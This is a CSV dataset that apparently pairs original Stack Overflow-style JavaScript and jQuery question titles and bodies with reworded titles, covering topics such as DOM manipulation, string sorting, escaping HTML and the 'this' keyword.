originalTitle,body,reformulatedTitle
Ho wdo I remove a child node in HTML using JavaScript?," Is there a function like document.getElementById(""FirstDiv"").clear()? <code> ",How can I remove a child node in HTML using JavaScript?
How do I remove a child node in HTML using JavaScript?," Is there a function like document.getElementById(""FirstDiv"").clear()? <code> ",How can I remove a child node in HTML using JavaScript?
Can Traditional Design Patterns be Implemented Using JavaScript?," I'm a moderately skilled programmer using JavaScript but I am no guru. I know you can do some pretty powerful things with it, I just haven't seen much other than fairly basic DOM manipulation. I'm wondering if people could provide some examples of traditional design pattern concepts such as Factory Method, Singleton, etc using JavaScript. In what cases would these patterns be used for on the web? <code> ",What Are Some Examples of Design Pattern Implementations Using JavaScript?
What Are Some Examples of Design Patterns Implementations Using JavaScript?," I'm a moderately skilled programmer using JavaScript but I am no guru. I know you can do some pretty powerful things with it, I just haven't seen much other than fairly basic DOM manipulation. I'm wondering if people could provide some examples of traditional design pattern concepts such as Factory Method, Singleton, etc using JavaScript. In what cases would these patterns be used for on the web? <code> ",What Are Some Examples of Design Pattern Implementations Using JavaScript?
Escaping strings with jQuery," Does anyone know of an easy way to escape HTML from strings in jQuery? I need to be able to pass an arbitrary string and have it properly escaped for display in an HTML page (preventing JavaScript/HTML injection attacks). I'm sure it's possible to extend jQuery to do this, but I don't know enough about the framework at the moment to accomplish this. <code> ",Escaping HTML strings with jQuery
Is there some way to introduce a delay in javascript?, Is there any JavaScript method similar to the jQuery delay() or wait() (to delay the execution of a script for a specific amount of time)? <code> ,Execute script after specific delay using JavaScript
What is the best calendar pop-up for populating a web form?," I want to be able to make an HTTP call updating some select boxes after a date is selected. I would like to be in control of updating the textbox so I know when there has been a ""true"" change (in the event the same date was selected). Ideally, I would call a function to pop-up the calendar and be able to evaluate the date before populating the text box...so I can do my validation before making a server call.  <code> ",What is the best calendar pop-up to populate a web form?
PHP and JavaScript regex," After my web form is submitted, a regex will be applied to user input on the server side (via PHP). I'd like to have the identical regex running in real-time on the client side to show the user what the real input will be. This will be pretty much the same as the Preview section on the Ask Question pages on Stack Overflow except with PHP on the back-end instead of .NET.What do I need to keep in mind in order to have my PHP and JavaScript regular expressions act exactly the same as each other? <code> ",Making a JavaScript regex equivalent to a PHP regex
How to transform a WebService call using behaviours?," We have some really old code that calls WebServices using behaviours (webservice.htc), and we are having some strange problems... since they've been deprecated a long time ago, I want to change the call.What's the correct way of doing it? It's ASP.NET 1.1 <code> ",How to transform a WebService call that is using behaviours?
What is the best approach for disabling a submit button?," Details:Only disable after user clicks the submit button, but before the posting back to the serverASP.NET Webforms (.NET 1.1)Prefer jQuery (if any library at all)Must be enabled if form reloads (i.e. credit card failed)This isn't a necessity that I do this, but if there is a simple way to do it without having to change too much, I'll do it. (i.e. if there isn't a simple solution, I probably won't do it, so don't worry about digging too deep) <code> ",What is the best approach for (client-side) disabling of a submit button?
How to read bound hover callback functions in jquery," I used jQuery to set hover callbacks for elements on my page. I'm now writing a module which needs to temporarily set new hover behaviour for some elements. The new module has no access to the original code for the hover functions.I want to store the old hover functions before I set new ones so I can restore them when finished with the temporary hover behaviour.I think these can be stored using the jQuery.data() function: Do stuff with new hover behaviour... But how do I get the currently registered hover functions from jQuery?Shadow2531, I am trying to do this without modifying the code which originally registered the callbacks. Your suggestion would work fine otherwise. Thanks for the suggestion, and for helping clarify what I'm searching for. Maybe I have to go into the source of jquery and figure out how these callbacks are stored internally. Maybe I should change the question to ""Is it possible to do this without modifying jquery?"" <code>  //save old hover behavior (somehow)$('#foo').data('oldhoverin',???)$('#foo').data('oldhoverout',???);//set new hover behavior$('#foo').hover(newhoverin,newhoverout); //restore old hover behaviour$('#foo').hover($('#foo').data('oldhoverin'),$('#foo').data('oldhoverout'));",How to read bound hover callback functions in jQuery
How do you do string comparison in javascript?," I have a list of objects I wish to sort based on a field attr of type string. I tried using - but found that - doesn't appear to work with strings in JavaScript. How can I sort a list of objects based on an attribute with type string? <code>  list.sort(function (a, b) { return a.attr - b.attr})",How to sort strings in JavaScript
How do you do string comparison in JavaScript?," I have a list of objects I wish to sort based on a field attr of type string. I tried using - but found that - doesn't appear to work with strings in JavaScript. How can I sort a list of objects based on an attribute with type string? <code>  list.sort(function (a, b) { return a.attr - b.attr})",How to sort strings in JavaScript
"Access to restricted URI denied"" code: ""1012", How do you get around this Ajax cross site scripting problem on FireFox 3? <code> ,Access to restricted URI denied code: 1012
<script> block," What is the reason browsers do not correctly recognize: Only this is recognized: Does this break the concept of XHTML support?Note: This statement is correct at least for all IE (6-8 beta 2). <code>  <script src=""foobar.js"" /> <!-- self-closing script element --> <script src=""foobar.js""></script>",Why don't self-closing script elements work?
Why don't self-closing script tags work?," What is the reason browsers do not correctly recognize: Only this is recognized: Does this break the concept of XHTML support?Note: This statement is correct at least for all IE (6-8 beta 2). <code>  <script src=""foobar.js"" /> <!-- self-closing script element --> <script src=""foobar.js""></script>",Why don't self-closing script elements work?
How do I enumerate the properties of a javascript object?," How do I enumerate the properties of a JavaScript object?I actually want to list all the defined variables and their values, but I've learned that defining a variable actually creates a property of the window object. <code> ",How do I enumerate the properties of a JavaScript object?
best cross-browser way to capture Ctrl+S with JavaScript," My users would like to be able to hit Ctrl+S to save a form. Is there a good cross-browser way of capturing the Ctrl+S key combination and submit my form?App is built on Drupal, so jQuery is available. <code> ",Best cross-browser method to capture CTRL+S with JQuery?
What is the best way to pack javascript without getting perfomance flaws?, I am searching for a way to compress JavaScript code for the iPhone. Is there a way to avoid using a lot of CPU time on the small and rather slow device? <code> ,What is the best way to pack JavaScript code without getting performance flaws?
What is the best way to pack JavaScript code without getting perfomance flaws?, I am searching for a way to compress JavaScript code for the iPhone. Is there a way to avoid using a lot of CPU time on the small and rather slow device? <code> ,What is the best way to pack JavaScript code without getting performance flaws?
Calculate text width with Javascript," I'd like to use JavaScript to calculate the width of a string. Is this possible without having to use a monospace typeface?If it's not built-in, my only idea is to create a table of widths for each character, but this is pretty unreasonable especially supporting Unicode and different type sizes (and all browsers for that matter). <code> ",Calculate text width with JavaScript
How to efficiently count the number of keys/properties of an object in JavaScript?," What's the fastest way to count the number of keys/properties of an object? Is it possible to do this without iterating over the object? I.e., without doing: (Firefox did provide a magic __count__ property, but this was removed somewhere around version 4.) <code>  var count = 0;for (k in myobj) if (myobj.hasOwnProperty(k)) ++count;",How to efficiently count the number of keys/properties of an object in JavaScript
jQuery $().find problem," I'm trying to get the contents of a XML document element, but the element has a colon in it's name.This line works for every element but the ones with a colon in the name: I assume that the colon needs escaping. How do I fix this? <code>  $(this).find(""geo:lat"").text();",Parsing XML with namespaces using jQuery $().find
this pointer inside object literal in javascript," I just came across an interesting situation in JavaScript. I have a class with a method that defines several objects using object-literal notation. Inside those objects, the this pointer is being used. From the behavior of the program, I have deduced that the this pointer is referring to the class on which the method was invoked, and not the object being created by the literal. This seems arbitrary, though it is the way I would expect it to work. Is this defined behavior? Is it cross-browser safe? Is there any reasoning underlying why it is the way it is beyond ""the spec says so"" (for instance, is it a consequence of some broader design decision/philosophy)? Pared-down code example: <code>  // inside class definition, itself an object literal, we have this function:onRender: function() { this.menuItems = this.menuItems.concat([ { text: 'Group by Module', rptletdiv: this }, { text: 'Group by Status', rptletdiv: this }]); // etc}","How does ""this"" keyword work within a function?"
"How does ""this"" keyword work within a JavaScript object literal?"," I just came across an interesting situation in JavaScript. I have a class with a method that defines several objects using object-literal notation. Inside those objects, the this pointer is being used. From the behavior of the program, I have deduced that the this pointer is referring to the class on which the method was invoked, and not the object being created by the literal. This seems arbitrary, though it is the way I would expect it to work. Is this defined behavior? Is it cross-browser safe? Is there any reasoning underlying why it is the way it is beyond ""the spec says so"" (for instance, is it a consequence of some broader design decision/philosophy)? Pared-down code example: <code>  // inside class definition, itself an object literal, we have this function:onRender: function() { this.menuItems = this.menuItems.concat([ { text: 'Group by Module', rptletdiv: this }, { text: 'Group by Status', rptletdiv: this }]); // etc}","How does ""this"" keyword work within a function?"
Inline vs. External Javascript," I would like to know when I should include external scripts or write them inline with the html code, in terms of performance and ease of maintenance.What is the general practice for this?Real-world-scenario - I have several html pages that need client-side form validation. For this I use a jQuery plugin that I include on all these pages. But the question is, do I:write the bits of code that configure this script inline?include all bits in one file that's share among all these html pages?include each bit in a separate external file, one for each html page?Thanks. <code> ",When should I use Inline vs. External Javascript?
jquery override form submit not working when submit called by javascript on a element," I've got a page with a normal form with a submit button and some jQuery which binds to the form submit event and overrides it with e.preventDefault() and runs an AJAX command. This works fine when the submit button is clicked but when a link with onclick='document.formName.submit();' is clicked, the event is not caught by the AJAX form submit event handler. Any ideas why not or how to get this working without binding to all the a elements? <code> ",jQuery override form submit not working when submit called by javascript on a element
Convert JavaScript String to be all lower case? ," How can I convert a JavaScript string value to be in all lower case letters?Example: ""Your Name"" to ""your name"" <code> ",Convert JavaScript String to be all lower case
Convert JavaScript String to be all lower case?," How can I convert a JavaScript string value to be in all lower case letters?Example: ""Your Name"" to ""your name"" <code> ",Convert JavaScript String to be all lower case
Detecting Unsaved Changes using JavaScript," I have a requirement to implement an ""Unsaved Changes"" prompt in an ASP .Net application. If a user modifies controls on a web form, and attempts to navigate away before saving, a prompt should appear warning them that they have unsaved changes, and give them the option to cancel and stay on the current page. The prompt should not display if the user hasn't touched any of the controls.Ideally I'd like to implement this in JavaScript, but before I go down the path of rolling my own code, are there any existing frameworks or recommended design patterns for achieving this? Ideally I'd like something that can easily be reused across multiple pages with minimal changes. <code> ",Detecting Unsaved Changes
CSS/Javascript Use Div to grey out section of page," Does anybody know a way with JavaScript or CSS to basically grey out a certain part of a form/div in HTML?I have a 'User Profile' form where I want to disable part of it for a 'Non-Premium' member, but want the user to see what is behind the form and place a 'Call to Action' on top of it.Does anybody know an easy way to do this either via CSS or JavaScript?Edit: I will make sure that the form doesn't work on server side so CSS or JavaScript will suffice. <code> ",CSS/JavaScript Use Div to grey out section of page
Is it worth coverting my functional JavaScript code to an object-oriented design?," I'm currently building a small web application that includes a fair amount of JavaScript. When I was prototyping the initial idea, I just hacked together a few functions to demonstrate how the application would eventually behave intending to go forward re-writing the JavaScript in an object-oriented nature.Now that I'm getting into the implementation phase, I'm finding that creating object-oriented JavaScript for the sake of being object-oriented seems overkill - the project isn't likely to require any major modifications in the future that would warrant and object-oriented design. Instead, I'm finding that a set of concise, cohesive functions are working well.So, with that said and with attempting to adhere to the KISS principle, when a set of functions are providing a suitable solution to a problem, are there any other reasons worth considering to convert my code into an object-oriented design? <code> ",Is it worth converting my functional JavaScript code to an object-oriented design?
